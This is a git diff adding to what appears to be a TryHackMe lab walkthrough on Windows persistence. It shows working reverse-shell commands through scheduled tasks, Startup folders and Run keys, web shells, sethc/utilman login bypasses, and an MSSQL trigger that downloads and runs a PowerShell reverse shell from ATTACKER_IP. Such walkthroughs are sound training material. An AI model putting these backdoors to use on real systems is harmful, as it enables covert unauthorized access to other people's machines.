@@ -145,7 +145,7 @@ To open the configuration window for WinRM's security descriptor, you can use th
 
 This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM.
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
 
 Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.
 
@@ -373,7 +373,7 @@ You should be able to find a stopped service called THMService3. To query the se
 sc.exe qc THMService3
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 There are three things we care about when using a service for persistence:
 
@@ -432,7 +432,7 @@ Let's create a task that runs a reverse shell every single minute. In a real-wor
 schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe $KALI 4449" /ru SYSTEM
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (10).png" alt=""><figcaption></figcaption></figure>
 
 Note: Be sure to use `THM-TaskBackdoor` as the name of your task, or you won't get the flag.
 
@@ -462,11 +462,11 @@ To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we c
 c:\tools\pstools\PsExec64.exe -s -i regedit
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (12).png" alt=""><figcaption></figcaption></figure>
 
 **Location**: Computer\HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 We will then delete the security descriptor for our task.
 
@@ -488,5 +488,306 @@ If we start an nc listener in our attacker's machine, we should get a shell back
 nc -lvp 4449
 ```
 
+<figure><img src="../../.gitbook/assets/image (3) (12).png" alt=""><figcaption></figcaption></figure>
+
+## Logon Triggered Persistence
+
+Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.
+
+### Startup folder
+
+Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.
+
+If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.
+
+For this task, let's generate a reverse shell payload using msfvenom.
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4450 -f exe -o revshell.exe
+```
+
+We will then copy our payload into the victim machine. You can spawn an `http.server` with Python3 and use wget on the victim machine to pull your file.
+
+**Kali**
+
+```
+python3 -m http.server
+```
+
+**Kali #2**
+
+```
+nc -lvnp 4450
+```
+
+**Victim(powershell)**
+
+```
+wget http://$KALI:8000/revshell.exe -O revshell.exe
+```
+
+We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine/
+
+**Victim(powershell)**
+
+```
+copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+```
+
+Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open).
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+And log back via RDP. You should immediately receive a connection back to your attacker's machine.
+
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+### Run / RunOnceYou can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
+
+* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
+* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
+* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
+
+The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.
+
+For this task, let's create a new reverse shell with msfvenom.
+
+**Kali**
+
+```
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4451 -f exe -o revshell2.exe
+```
+
+**Kali**
+
+```
+python3 -m http.server
+```
+
+**Kali #2**
+
+```
+nc -lvnp 4451
+```
+
+**Victim(powershell)**
+
+```
+wget http://$KALI:8000/revshell.exe -O revshell2.exe
+```
+
+After transferring it to the victim machine, let's move it to C:\Windows:
+
+**Victim(powershell)**
+
+```
+move revshell2.exe C:\Windows
+```
+
+Let's then create a REG\_EXPAND\_SZ registry entry under **HKLM\Software\Microsoft\Windows\CurrentVersion\Run**. The entry's name can be anything you like, and the value will be the command we want to execute.
+
+Note: While in a real-world set-up you could use any name for your registry entry, for this task you are required to use **MyBackdoor** to receive the flag.
+
+**Victim(cmd)**
+
+<pre><code><strong>C:\tools\pstools\PsExec64.exe -i -s regedit
+</strong></code></pre>
+
+![](../../.gitbook/assets/image.png)
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+###
+
+### Persisting Through Existing Services
+
+### Using Web Shells
+
+The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the [Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20).
+
+Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory.
+
+**Victim(cmd)**
+
+```
+move shell.aspx C:\inetpub\wwwroot\
+```
+
+Note: Depending on the way you create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.
+
+We can then run commands from the web server by pointing to the following URL:
+
+`http://MACHINE_IP/shell.aspx`
+
+
+
+While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.
+
+
+
+
+
+## Backdooring the Login Screen / RDP
+
+If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.
+
+We will look at two methods that rely on accessibility features to this end.
+
+### Sticky Keys
+
+When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.
+
+To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows.
+
+
+
+After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
+
+A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
+
+To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands.
+
+**Victim(cmd)**
+
+```
+takeown /f c:\Windows\System32\sethc.exe
+
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+```
+
+After doing so, lock your session from the start menu.
+
+
+
+You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen.
+
+
+
+### Utilman
+
+Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen.
+
+
+
+
+
+When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.
+
+To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:
+
+**Victim(cmd)**
+
+```
+takeown /f c:\Windows\System32\utilman.exe
+
+icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+
+copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+```
+
+To trigger our terminal, we will lock our screen from the start button.
+
+
+
+And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges.
+
+
+
+## Persisting Through Existing Services
+
+There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, **triggers** in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the `HRDB` database.
+
+Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.
+
+To enable it, let's open `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just use **Windows Authentication** (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.
+
+Once logged in, click on the New Query button to open the query editor.
+
+Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
+
+```
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+
+After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa` user, which is the default database administrator.
+
+```
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+```
+
+After all of this, we finally configure a trigger. We start by changing to the `HRDB` database.
+
+```
+USE HRDB
+```
+
+Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database.
+
+```
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+```
+
+Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell.
+
+**evilscript.ps1**
+
+```
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+```
+
+We will need to open two terminals to handle the connections involved in this exploit:
+
+* The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
+* The second connection will be a reverse shell on port 4454 back to our attacker machine.
+
+**Kali #1**
+
+```
+python3 -m http.server
+```
+
+**Kali #2**
+
+```
+nc -lvp 4454
+```
+
+With all that ready, let's navigate to `http://MACHINE_IP/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
+
+##
 
